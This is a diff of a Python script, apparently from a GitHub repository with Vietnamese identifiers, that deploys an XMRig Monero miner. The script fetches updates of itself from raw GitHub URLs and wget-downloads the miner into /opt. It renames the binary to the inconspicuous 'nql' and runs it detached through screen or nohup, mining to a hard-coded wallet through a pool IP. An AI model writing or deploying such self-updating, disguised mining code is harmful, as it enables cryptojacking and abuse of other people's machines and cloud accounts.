@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-import multiprocessing
+#import multiprocessing
 
 
 if platform == "linux" or platform == "linux2":
@@ -13,10 +13,10 @@ elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'win'
-cores = multiprocessing.cpu_count()
+#cores = multiprocessing.cpu_count()
 #cores = cores - 1
-if cores <= 0:
-    cores = 1
+#if cores <= 0:
+#    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
 
@@ -35,14 +35,15 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.batch_account_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
+command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(working_dir)
     path_app = os.path.realpath(__file__)
-    version_chinh = 5.0
+    version_chinh = 5.1
     link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_batch_account_cpu'
     link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/batch_account_cpu.py'
     try:
@@ -87,7 +88,7 @@ while True:
         link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/command_xmrig'
         gz_name = 'xmrig_linux.gz'
         folder_xmrig = 'xmrig_linux'
-        xmrig_name = 'xmrig'
+        xmrig_name = 'nql'
         try:
             if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
                 print('Chua co chuong trinh %s' %xmrig_name)
@@ -96,6 +97,7 @@ while True:
                 os.system('wget %s' %link_download_xmrig)
                 os.system('tar xf %s' %gz_name)
                 os.chdir('/opt/%s' %folder_xmrig)
+                os.system('cp xmrig %s' %xmrig_name)
                 #workingdir = os.getcwd()
                 os.system('chmod 777 %s' %xmrig_name)
             else:
@@ -138,17 +140,21 @@ while True:
                     break
         except:
             pass
-        if xmrig_dachay == False:
-            command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
-            print(command)
-            if os.path.isfile('/usr/bin/screen'):
-                print('Co chuong trinh screen')
-                os.system ('screen -dmS %s %s' %(xmrig_name, command))
-            elif os.path.isfile('/usr/bin/nohup'):
-                print('Co chuong trinh nohup')
-                os.system ('nohup %s &' %command)
-            else:
-                os.system ('%s &' %command)
+
+        try:
+            if xmrig_dachay == False:
+                command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
+                print(command)
+                if os.path.isfile('/usr/bin/screen'):
+                    print('Co chuong trinh screen')
+                    os.system ('screen -dmS %s %s' %(xmrig_name, command))
+                elif os.path.isfile('/usr/bin/nohup'):
+                    print('Co chuong trinh nohup')
+                    os.system ('nohup %s &' %command)
+                else:
+                    os.system ('%s &' %command)
+        except:
+            pass
 
         '''
         #pkt
